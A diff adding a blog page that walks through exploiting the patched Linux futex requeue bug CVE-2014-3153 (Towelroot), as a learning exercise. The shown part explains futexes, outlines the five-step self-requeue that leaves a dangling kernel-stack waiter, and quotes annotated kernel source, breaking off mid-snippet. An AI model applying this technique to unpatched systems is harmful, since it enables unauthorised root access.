@@ -1,0 +1,1293 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Exploiting CVE-2014-3153 (Towelroot) | Elon Gliksberg</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Exploiting CVE-2014-3153 (Towelroot)" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Understanding The Kernel For quite some time now, I’ve been wanting to unveil the internals of modern operating systems. I didn’t like how the most basic and fundamental level of a computer was so abstract to me, and that I did not truly grasp how some of it works, a “black-box”." />
+<meta property="og:description" content="Understanding The Kernel For quite some time now, I’ve been wanting to unveil the internals of modern operating systems. I didn’t like how the most basic and fundamental level of a computer was so abstract to me, and that I did not truly grasp how some of it works, a “black-box”." />
+<link rel="canonical" href="https://elongl.github.io/exploitation/2021/01/08/cve-2014-3153.html" />
+<meta property="og:url" content="https://elongl.github.io/exploitation/2021/01/08/cve-2014-3153.html" />
+<meta property="og:site_name" content="Elon Gliksberg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-01-08T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Exploiting CVE-2014-3153 (Towelroot)" />
+<script type="application/ld+json">
+{"headline":"Exploiting CVE-2014-3153 (Towelroot)","dateModified":"2021-01-08T00:00:00+00:00","datePublished":"2021-01-08T00:00:00+00:00","description":"Understanding The Kernel For quite some time now, I’ve been wanting to unveil the internals of modern operating systems. I didn’t like how the most basic and fundamental level of a computer was so abstract to me, and that I did not truly grasp how some of it works, a “black-box”.","url":"https://elongl.github.io/exploitation/2021/01/08/cve-2014-3153.html","mainEntityOfPage":{"@type":"WebPage","@id":"https://elongl.github.io/exploitation/2021/01/08/cve-2014-3153.html"},"@type":"BlogPosting","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://elongl.github.io/feed.xml" title="Elon Gliksberg" /><script>
+if(!(window.doNotTrack === "1" || navigator.doNotTrack === "1" || navigator.doNotTrack === "yes" || navigator.msDoNotTrack === "1")) {
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-187846960-1', 'auto');
+  ga('send', 'pageview');
+}
+</script>
+  
+</head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Elon Gliksberg</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Exploiting CVE-2014-3153 (Towelroot)</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-01-08T00:00:00+00:00" itemprop="datePublished">Jan 8, 2021
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h1 id="understanding-the-kernel">Understanding The Kernel</h1>
+<p>For quite some time now, I’ve been wanting to unveil the internals of modern operating systems.<br />
+I didn’t like how the most basic and fundamental level of a computer was so abstract to me,<br />
+and that I did not <em>truly</em> grasp how some of it works, a “black-box”.</p>
+
+<p>I’ve always been more than familiar with kernel and OS concepts,<br />
+but there’s a big gap from comprehending them as a user versus a kernel hacker.<br />
+<strong>I wanted to see code, not words.</strong></p>
+
+<p>In order to tackle that,
+I decided to take on a small kernel exploit <a href="https://github.com/elongl/pwnable.kr/tree/master/syscall">challenge</a>, and in parallel read <a href="https://books.google.co.il/books/about/Linux_Kernel_Development.html?id=3MWRMYRwulIC">Linux Kernel Development</a>.
+Initially, the thought of reading the kernel’s code seemed a bit spooky, <em>“I wouldn’t understand a thing”</em>.
+Little by little, it wasn’t as intimidating, and honestly, it turned out to be quite easier than I expected.</p>
+
+<p>Now, I feel tenfolds more comfortable to simply look something up in the source in order to understand how it works,
+rather than searching man pages endlessly or consulting other people.</p>
+
+<p><img src="https://i.imgur.com/vJP3B8i.png" alt="Linux Kernel Image" /></p>
+
+<h1 id="kernel-exploitation">Kernel Exploitation</h1>
+<p>The book was really nice and all, but I wanted to get my hands dirty.<br />
+I searched for a disclosed vulnerability within the Linux kernel,<br />
+my plan being that I’d read its flat description and develop my own exploit to it.<br />
+A friend recommended <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3153">CVE-2014-3153</a>, also known as <em>Towelroot</em>, and I just went for it.<br />
+Back in the days, it was very commonly used in order to root Android devices.</p>
+
+<h1 id="fast-userspace-mutex">Fast Userspace Mutex</h1>
+<p>The vulnerability is based around a mechanism called <em>Futex</em> within the kernel.<br />
+Futex being a wordplay on <em>Fast userspace Mutex</em>.</p>
+
+<p>The Linux kernel provides futexes as a building block for implementing userspace locking.<br />
+A Futex is identified by a piece of memory which can be shared
+between processes or threads. In its bare form, a
+Futex is a counter that can be incremented and decremented atomically
+and processes can wait for its value to become positive.</p>
+
+<p>Futex operation occurs entirely in userspace for the noncontended case.<br />
+The kernel is involved only to arbitrate the contended case.<br />
+Lock contention is a state where a thread attempts to acquire a lock that is already held by another thread.</p>
+
+<blockquote>
+  <p>The futex() system call provides a method for waiting until a
+  certain condition becomes true.  It is typically used as a
+  blocking construct in the context of shared-memory
+  synchronization.  When using futexes, the majority of the
+  synchronization operations are performed in user space.  A user-
+  space program employs the futex() system call only when it is
+  likely that the program has to block for a longer time until the
+  condition becomes true.  Other futex() operations can be used to
+  wake any processes or threads waiting for a particular condition.</p>
+</blockquote>
+
+<p>I will cover <strong>only</strong> the terms and concepts related to the exploitation.<br />
+For a more profound insight about futexes, please reference <a href="https://man7.org/linux/man-pages/man2/futex.2.html">man futex(2)</a> and <a href="https://man7.org/linux/man-pages/man7/futex.7.html">man futex(7)</a>.<br />
+I strongly suggest messing around with the examples in order to assess your understanding.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">futex()</code> syscall isn’t typically used by “everyday” programs, but rather by system libraries such as <code class="language-plaintext highlighter-rouge">pthreads</code> that wrap its usage.
+That’s why the syscall doesn’t have a glibc wrapper like most syscalls do.
+In order to call it, one has to use <code class="language-plaintext highlighter-rouge">syscall(SYS_futex, ...)</code>.</p>
+
+<p>Due to the blocking nature of <code class="language-plaintext highlighter-rouge">futex()</code> and it being a way to synchronize between different tasks,<br />
+you’d notice how there’s a lot of dealing with threads within the exploit which can get slightly confusing unless approached slowly.</p>
+
+<p>There are two core concepts to understand about futexes in general which we’d talk a lot about.</p>
+
+<p>The first is something’s called a <em>waiters list</em>, also known as the <em>wait queue</em>.<br />
+This term refers to the blocking threads that are currently waiting for a lock to be released.<br />
+It is held in kernelspace and programs can issue syscalls to carry out operations on it.
+For instance, attempting to lock a contended lock would result in an insertion of a waiter,
+releasing a lock would pop a waiter from the list and reschedule its task.</p>
+
+<p>The second is that there are two kinds of futexes: PI &amp; non-PI.<br />
+PI stands for <a href="https://en.wikipedia.org/wiki/Priority_inheritance">Priority Inheritance</a>.</p>
+<blockquote>
+  <p>Priority inheritance is a mechanism for dealing with the
+   priority-inversion problem.  With this mechanism, when a high-
+   priority task becomes blocked by a lock held by a low-priority
+   task, the priority of the low-priority task is temporarily raised
+   to that of the high-priority task, so that it is not preempted by
+   any intermediate level tasks, and can thus make progress toward
+   releasing the lock.</p>
+</blockquote>
+
+<p>This introduces the ability to prioritize waiters among the futex’s waiters list.<br />
+A higher-priority task is guaranteed to get the lock faster than a lower-priority task.<br />
+Unlike non-PI operations, for instance.</p>
+<blockquote>
+  <p>FUTEX_WAKE<br />
+  This operation wakes at most val of the waiters that are
+  waiting (e.g., inside FUTEX_WAIT) on the futex word at the
+  address uaddr.  Most commonly, val is specified as either
+  1 (wake up a single waiter) or INT_MAX (wake up all
+  waiters).  No guarantee is provided about which waiters
+  are awoken (e.g., a waiter with a higher scheduling
+  priority is <strong>not guaranteed</strong> to be awoken in preference to a
+  waiter with a lower priority).</p>
+</blockquote>
+
+<p>Both non-PI and PI futex types are used within the exploit.<br />
+The way PI futexes are implemented is using what’s called in the kernel a <em>plist</em>, a priority-sorted list.<br />
+If you don’t know what it is, you could take a look <a href="https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/plist.h#L46">here</a>,
+though this image sums it up perfectly.</p>
+
+<p><img src="https://i.imgur.com/IBxItuz.png" alt="Priority List Image" /></p>
+<p style="text-align: center; font-style: italic"><small>All images are copied from Appdome.</small></p>
+
+<h1 id="bug--vulnerability">Bug &amp; Vulnerability</h1>
+<p>Here’s the CVE description.</p>
+<blockquote>
+  <p>The futex_requeue function in kernel/futex.c in the Linux kernel through 3.14.5
+  does not ensure that calls have two different futex addresses, which allows local users to gain privileges
+  via a crafted FUTEX_REQUEUE command that facilitates unsafe waiter modification.</p>
+</blockquote>
+
+<p>Let’s break it down.<br />
+First, we need to understand what’s a requeue operation in the context of futexes.<br />
+A waiter, blocking thread, that is contending on a lock,
+can be “requeued” by a running thread to be told to wait on a different lock instead of the one that it currently waits on.</p>
+
+<p>A waiter on a non-PI futex can be requeued to either a different non-PI futex, or to a PI-futex.<br />
+A waiter on a PI-futex cannot be requeued.<br />
+The bug itself is that there are <strong>no validations whatsoever on requeuing from a futex to itself</strong>.</p>
+
+<p>This allows us to requeue a PI-futex waiter to itself, which clearly violates the following policy.</p>
+<blockquote>
+  <p>FUTEX_CMP_REQUEUE_PI<br />
+  Requeues waiters that are blocked via
+  FUTEX_WAIT_REQUEUE_PI on uaddr from a <strong>non-PI source</strong> futex
+  (uaddr) to a <strong>PI target</strong> futex (uaddr2).</p>
+</blockquote>
+
+<p>Take a look at the <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=e9c243a5a6de0be8e584c604d353412584b592f8">bug fix commit</a>, both the description and the code changes.</p>
+
+<p>Though, what actually happens when you requeue a waiter to itself? Good question.</p>
+
+<p>Before actually diving into the exploit, I decided to provide a rough overview of how it works for context further on.
+Eventually, what this bug gives us is a <strong>dangling waiter</strong> within the futex’s waiters list.
+The way the exploit does that is as follows:</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><strong>Step</strong></td>
+      <td><strong>Operation</strong></td>
+      <td><strong>Description</strong></td>
+    </tr>
+    <tr>
+      <td>1.</td>
+      <td><code class="language-plaintext highlighter-rouge">FUTEX_LOCK_PI</code></td>
+      <td>Lock a PI futex.</td>
+    </tr>
+    <tr>
+      <td>2.</td>
+      <td><code class="language-plaintext highlighter-rouge">FUTEX_WAIT_REQUEUE_PI</code></td>
+      <td>Wait on a non-PI futex, with the intention of being requeued to the PI futex.</td>
+    </tr>
+    <tr>
+      <td>3.</td>
+      <td><code class="language-plaintext highlighter-rouge">FUTEX_CMP_REQUEUE_PI</code></td>
+      <td>Requeue the non-PI futex waiter onto the PI futex.</td>
+    </tr>
+    <tr>
+      <td>4.</td>
+      <td>Userspace Overwrite</td>
+      <td>Set the PI futex’s value to <code class="language-plaintext highlighter-rouge">0</code> so that the kernel treats it as if the lock is available.</td>
+    </tr>
+    <tr>
+      <td>5.</td>
+      <td><code class="language-plaintext highlighter-rouge">FUTEX_CMP_REQUEUE_PI</code></td>
+      <td>Requeue the PI futex waiter to <strong>itself</strong>.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>And now we’ll understand why this results in a dangling waiter.</p>
+
+<p>There are a lot of different data types within the Futex’s implementation code,<br />
+in order to cope with that I made somewhat of a <a href="https://github.com/elongl/CVE-2014-3153/blob/master/notes.md#data-structures">summary of them</a> to help me keep track of what’s going on.
+Feel free to use it as needed.</p>
+
+<p><strong>Step 1</strong></p>
+
+<p>We start off by locking the PI-futex.
+We do that because we want the first requeue (step 3) to block and create a waiter on the waiters list, rather than acquire the lock immediately.
+That waiter is destined to be our dangling waiter later on in the exploit.</p>
+
+<p><strong>Step 2</strong></p>
+
+<p>In order to requeue a waiter from a non-PI –&gt; PI futex, we first have to invoke <code class="language-plaintext highlighter-rouge">FUTEX_WAIT_REQUEUE_PI</code> on the non-PI futex,
+which in turn translates to the <a href="https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L2285"><code class="language-plaintext highlighter-rouge">futex_wait_requeue_pi()</code></a> function.<br />
+What this function does is take a non-PI futex and wait (<code class="language-plaintext highlighter-rouge">FUTEX_WAIT</code>) on it,
+and a PI-futex that it can <em>potentially</em> be requeued to with a <code class="language-plaintext highlighter-rouge">FUTEX_CMP_REQUEUE_PI</code> command later on.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">futex_wait_requeue_pi</span><span class="p">(</span><span class="n">u32</span> <span class="n">__user</span> <span class="o">*</span><span class="n">uaddr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span>
+				 <span class="n">u32</span> <span class="n">val</span><span class="p">,</span> <span class="n">ktime_t</span> <span class="o">*</span><span class="n">abs_time</span><span class="p">,</span> <span class="n">u32</span> <span class="n">bitset</span><span class="p">,</span>
+				 <span class="n">u32</span> <span class="n">__user</span> <span class="o">*</span><span class="n">uaddr2</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">struct</span> <span class="n">hrtimer_sleeper</span> <span class="n">timeout</span><span class="p">,</span> <span class="o">*</span><span class="n">to</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">rt_mutex_waiter</span> <span class="n">rt_waiter</span><span class="p">;</span> <span class="c1">// &lt;-- Important</span>
+	<span class="k">struct</span> <span class="n">rt_mutex</span> <span class="o">*</span><span class="n">pi_mutex</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">futex_hash_bucket</span> <span class="o">*</span><span class="n">hb</span><span class="p">;</span>
+	<span class="k">union</span> <span class="n">futex_key</span> <span class="n">key2</span> <span class="o">=</span> <span class="n">FUTEX_KEY_INIT</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">futex_q</span> <span class="n">q</span> <span class="o">=</span> <span class="n">futex_q_init</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">res</span><span class="p">,</span> <span class="n">ret</span><span class="p">;</span>
+  <span class="p">...</span>
+</code></pre></div></div>
+
+<p>The function defines various local variables, the most important of which is the <code class="language-plaintext highlighter-rouge">rt_waiter</code> variable.<br />
+Unsurprisingly, this variable is our waiter.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">rt_mutex_waiter</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">plist_node</span>    <span class="n">list_entry</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">plist_node</span>    <span class="n">pi_list_entry</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">task_struct</span>    <span class="o">*</span><span class="n">task</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">rt_mutex</span>        <span class="o">*</span><span class="n">lock</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+<p>It contains the <code class="language-plaintext highlighter-rouge">lock</code> that it waits on,
+it holds references to other waiters in the waiters list through the <code class="language-plaintext highlighter-rouge">list_entry</code> plist node,
+and on top of that it also has a pointer to the <code class="language-plaintext highlighter-rouge">task</code> that it currently blocks.</p>
+
+<p>Needless to say that the locals are placed on the kernel stack,
+but also worth mentioning that because it’ll be crucial to understand in the near future.</p>
+
+<p>Later on, it initializes the futex queue entry and enqueues it.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">q</span><span class="p">.</span><span class="n">bitset</span> <span class="o">=</span> <span class="n">bitset</span><span class="p">;</span>
+	<span class="n">q</span><span class="p">.</span><span class="n">rt_waiter</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rt_waiter</span><span class="p">;</span>
+	<span class="n">q</span><span class="p">.</span><span class="n">requeue_pi_key</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">key2</span><span class="p">;</span>
+  <span class="p">...</span>
+	<span class="cm">/* Queue the futex_q, drop the hb lock, wait for wakeup. */</span>
+	<span class="n">futex_wait_queue_me</span><span class="p">(</span><span class="n">hb</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">q</span><span class="p">,</span> <span class="n">to</span><span class="p">);</span>
+</code></pre></div></div>
+<p>Note how it sets the <code class="language-plaintext highlighter-rouge">requeue_pi_key</code> to the futex key of the target futex.<br />
+This is part of what allows us to self-requeue. We’ll see this in the final step.</p>
+
+<p>At this point in the code, the function simply blocks and does not continue unless:</p>
+<ol>
+  <li>A wakeup occurs.</li>
+  <li>The process is killed.</li>
+</ol>
+
+<p><strong>Step 3</strong></p>
+
+<p>Next up, <a href="https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L1264"><code class="language-plaintext highlighter-rouge">futex_requeue()</code></a> is called by the <code class="language-plaintext highlighter-rouge">FUTEX_CMP_REQUEUE_PI</code> operation in another thread in order to do the heavy lifting of actually requeuing the waiter.
+This is the <strong>vulnerable</strong> and most important function in the exploit.
+The function is fairly long and therefore I’m not going to review all of its logic, and rather only address the relevant parts.<br />
+I do encourage you to brief over it and try to get a hold of what it does.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">futex_requeue</span><span class="p">(</span><span class="n">u32</span> <span class="n">__user</span> <span class="o">*</span><span class="n">uaddr1</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span>
+             <span class="n">u32</span> <span class="n">__user</span> <span class="o">*</span><span class="n">uaddr2</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nr_wake</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nr_requeue</span><span class="p">,</span>
+             <span class="n">u32</span> <span class="o">*</span><span class="n">cmpval</span><span class="p">,</span> <span class="kt">int</span> <span class="n">requeue_pi</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="p">...</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">requeue_pi</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">task_count</span> <span class="o">-</span> <span class="n">nr_wake</span> <span class="o">&lt;</span> <span class="n">nr_requeue</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="n">futex_proxy_trylock_atomic</span><span class="p">(</span><span class="n">uaddr2</span><span class="p">,</span> <span class="n">hb1</span><span class="p">,</span> <span class="n">hb2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key1</span><span class="p">,</span>
+                <span class="o">&amp;</span><span class="n">key2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi_state</span><span class="p">,</span> <span class="n">nr_requeue</span><span class="p">);</span>
+	<span class="cm">/*
+	 * Lock is already acquired due to our call to FUTEX_LOCK_PI in step 1.
+	 * Therefore the acquisition fails and 0 is returned.
+	 * We will revisit futex_proxy_trylock_atomic below.
+	 */</span>
+<span class="p">...</span>
+    <span class="n">head1</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">hb1</span><span class="o">-&gt;</span><span class="n">chain</span><span class="p">;</span>
+    <span class="n">plist_for_each_entry_safe</span><span class="p">(</span><span class="n">this</span><span class="p">,</span> <span class="n">next</span><span class="p">,</span> <span class="n">head1</span><span class="p">,</span> <span class="n">list</span><span class="p">)</span> <span class="p">{</span>
+<span class="p">...</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">requeue_pi</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">atomic_inc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pi_state</span><span class="o">-&gt;</span><span class="n">refcount</span><span class="p">);</span>
+            <span class="n">this</span><span class="o">-&gt;</span><span class="n">pi_state</span> <span class="o">=</span> <span class="n">pi_state</span><span class="p">;</span>
+            <span class="n">ret</span> <span class="o">=</span> <span class="n">rt_mutex_start_proxy_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pi_state</span><span class="o">-&gt;</span><span class="n">pi_mutex</span><span class="p">,</span>
+                            <span class="n">this</span><span class="o">-&gt;</span><span class="n">rt_waiter</span><span class="p">,</span>
+                            <span class="n">this</span><span class="o">-&gt;</span><span class="n">task</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+	<span class="cm">/* 
+	 * this-&gt;rt_waiter points to the local variable rt_waiter
+	 * in the futex_wait_requeue_pi from step 2.
+	 * It is now added as a waiter on the new lock.
+	 */</span>
+<span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Let’s quickly glance at the code that requeues the waiter at <a href="https://elixir.bootlin.com/linux/v3.11.4/source/kernel/rtmutex.c#L962"><code class="language-plaintext highlighter-rouge">rt_mutex_start_proxy_lock()</code></a>.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">rt_mutex_start_proxy_lock</span><span class="p">(</span><span class="k">struct</span> <span class="n">rt_mutex</span> <span class="o">*</span><span class="n">lock</span><span class="p">,</span>
+			      <span class="k">struct</span> <span class="n">rt_mutex_waiter</span> <span class="o">*</span><span class="n">waiter</span><span class="p">,</span>
+			      <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">,</span> <span class="kt">int</span> <span class="n">detect_deadlock</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
+
+	<span class="n">raw_spin_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lock</span><span class="o">-&gt;</span><span class="n">wait_lock</span><span class="p">);</span>
+
+	<span class="c1">// Attempt to take the lock. Fails because lock is taken.</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">try_to_take_rt_mutex</span><span class="p">(</span><span class="n">lock</span><span class="p">,</span> <span class="n">task</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
+		<span class="n">raw_spin_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lock</span><span class="o">-&gt;</span><span class="n">wait_lock</span><span class="p">);</span>
+		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">ret</span> <span class="o">=</span> <span class="n">task_blocks_on_rt_mutex</span><span class="p">(</span><span class="n">lock</span><span class="p">,</span> <span class="n">waiter</span><span class="p">,</span> <span class="n">task</span><span class="p">,</span> <span class="n">detect_deadlock</span><span class="p">);</span>
+	<span class="p">...</span>
+</code></pre></div></div>
+<p>And inside <a href="https://elixir.bootlin.com/linux/v3.11.4/source/kernel/rtmutex.c#L405"><code class="language-plaintext highlighter-rouge">task_blocks_on_rt_mutex()</code></a>.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">task_blocks_on_rt_mutex</span><span class="p">(</span><span class="k">struct</span> <span class="n">rt_mutex</span> <span class="o">*</span><span class="n">lock</span><span class="p">,</span>
+				   <span class="k">struct</span> <span class="n">rt_mutex_waiter</span> <span class="o">*</span><span class="n">waiter</span><span class="p">,</span>
+				   <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">,</span>
+				   <span class="kt">int</span> <span class="n">detect_deadlock</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">owner</span> <span class="o">=</span> <span class="n">rt_mutex_owner</span><span class="p">(</span><span class="n">lock</span><span class="p">);</span>
+	<span class="k">struct</span> <span class="n">rt_mutex_waiter</span> <span class="o">*</span><span class="n">top_waiter</span> <span class="o">=</span> <span class="n">waiter</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">flags</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">chain_walk</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">res</span><span class="p">;</span>
+<span class="p">...</span>
+	<span class="c1">// Set the waiter's task and rt_mutex members.</span>
+	<span class="n">waiter</span><span class="o">-&gt;</span><span class="n">task</span> <span class="o">=</span> <span class="n">task</span><span class="p">;</span>
+	<span class="n">waiter</span><span class="o">-&gt;</span><span class="n">lock</span> <span class="o">=</span> <span class="n">lock</span><span class="p">;</span>
+	<span class="c1">// Initialize the waiter's list entries.</span>
+	<span class="n">plist_node_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">waiter</span><span class="o">-&gt;</span><span class="n">list_entry</span><span class="p">,</span> <span class="n">task</span><span class="o">-&gt;</span><span class="n">prio</span><span class="p">);</span>
+	<span class="n">plist_node_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">waiter</span><span class="o">-&gt;</span><span class="n">pi_list_entry</span><span class="p">,</span> <span class="n">task</span><span class="o">-&gt;</span><span class="n">prio</span><span class="p">);</span>
+
+	<span class="cm">/* Get the top priority waiter on the lock */</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">rt_mutex_has_waiters</span><span class="p">(</span><span class="n">lock</span><span class="p">))</span>
+		<span class="n">top_waiter</span> <span class="o">=</span> <span class="n">rt_mutex_top_waiter</span><span class="p">(</span><span class="n">lock</span><span class="p">);</span>
+
+	<span class="c1">// Add the waiter to the waiters list.</span>
+	<span class="n">plist_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">waiter</span><span class="o">-&gt;</span><span class="n">list_entry</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lock</span><span class="o">-&gt;</span><span class="n">wait_list</span><span class="p">);</span>
+<span class="p">...</span>
+</code></pre></div></div>
+<p>Now, <code class="language-plaintext highlighter-rouge">rt_waiter</code> of <a href="https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L2285"><code class="language-plaintext highlighter-rouge">futex_wait_requeue_pi()</code></a> is a node in the waiters list of our PI futex.</p>
+
+<p><strong>Step 4</strong></p>
+
+<p>Here we’ll set the userspace value of the futex, also known as the futex-word, to <code class="language-plaintext highlighter-rouge">0</code>.<br />
+This is vital so that when the self-requeuing occurs,
+the call to <a href="https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L1202"><code class="language-plaintext highlighter-rouge">futex_proxy_trylock_atomic()</code></a> will succeed and wake the top waiter of the source futex,
+which is in fact the same as the destination futex.
+The problem arises when we have a waiter in the waiters list whose thread we can wake up without forcing its deletion from the waiters list.</p>
+
+<p>It might seem confusing at first but it’ll clear up in the next step.</p>
+
+<p><strong>Step 5</strong></p>
+
+<p>On this step, we’ll requeue the PI futex waiter to itself and invoke <a href="https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L1264"><code class="language-plaintext highlighter-rouge">futex_requeue()</code></a> once again.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">requeue_pi</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">task_count</span> <span class="o">-</span> <span class="n">nr_wake</span> <span class="o">&lt;</span> <span class="n">nr_requeue</span><span class="p">))</span> <span class="p">{</span>
+		<span class="cm">/*
+		 * Attempt to acquire uaddr2 and wake the top waiter. If we
+		 * intend to requeue waiters, force setting the FUTEX_WAITERS
+		 * bit.  We force this here where we are able to easily handle
+		 * faults rather in the requeue loop below.
+		 */</span>
+		<span class="n">ret</span> <span class="o">=</span> <span class="n">futex_proxy_trylock_atomic</span><span class="p">(</span><span class="n">uaddr2</span><span class="p">,</span> <span class="n">hb1</span><span class="p">,</span> <span class="n">hb2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key1</span><span class="p">,</span>
+						 <span class="o">&amp;</span><span class="n">key2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi_state</span><span class="p">,</span> <span class="n">nr_requeue</span><span class="p">);</span>
+     <span class="p">...</span>
+</code></pre></div></div>
+
+<p>Let’s take a look at <a href="https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L1202"><code class="language-plaintext highlighter-rouge">futex_proxy_trylock_atomic()</code></a> this time.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+ * Return:
+ *  0 - failed to acquire the lock atomically;
+ *  1 - acquired the lock;
+ * &lt;0 - error
